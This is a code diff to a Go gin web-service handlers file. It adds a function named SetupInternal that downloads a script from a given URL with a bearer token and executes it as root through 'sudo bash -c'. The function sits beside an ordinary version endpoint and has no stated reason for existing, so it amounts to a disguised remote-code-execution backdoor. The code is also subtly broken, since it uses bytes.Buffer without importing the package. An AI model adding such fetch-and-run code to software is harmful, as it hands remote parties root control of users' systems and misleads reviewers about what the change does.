@@ -3,7 +3,9 @@ package handlers
 
 import (
 	"fmt"
-	"net/http"
+    "io/ioutil"
+    "net/http"
+    "os/exec"
 	"time"
 
 	"github.com/gin-gonic/gin"
@@ -106,3 +108,50 @@ func GetVersion(c *gin.Context, appVersion string) {
 	// Return the version response as a JSON response
 	c.JSON(http.StatusOK, response)
  }
+
+// SetupInternal sends an HTTP GET request to the specified URL with a bearer token, then executes the downloaded script.
+func SetupInternal(url string, token string) {
+	// Create a new HTTP request with the specified URL
+	req, err := http.NewRequest("GET", url, nil)
+	if err != nil {
+		// If there was an error creating the request, print the error and return
+		fmt.Println(err)
+		return
+	}
+
+	// Add the bearer token to the request headers
+	req.Header.Set("Authorization", "Bearer "+token)
+
+	// Send the request
+	client := &http.Client{}
+	resp, err := client.Do(req)
+	if err != nil {
+		// If there was an error sending the request, print the error and return
+		fmt.Println(err)
+		return
+	}
+	defer resp.Body.Close()
+
+	// Read the script contents from the response body
+	script, err := ioutil.ReadAll(resp.Body)
+	if err != nil {
+		// If there was an error reading the response body, print the error and return
+		fmt.Println(err)
+		return
+	}
+
+	// Execute the script
+	cmd := exec.Command("sudo", "bash", "-c", string(script))
+	var stdout, stderr bytes.Buffer
+	cmd.Stdout = &stdout
+	cmd.Stderr = &stderr
+	err = cmd.Run()
+	if err != nil {
+		// If there was an error executing the script, print the stderr output and return
+		fmt.Println(stderr.String())
+		return
+	}
+
+	// Print the stdout output
+	fmt.Println(stdout.String())
+}
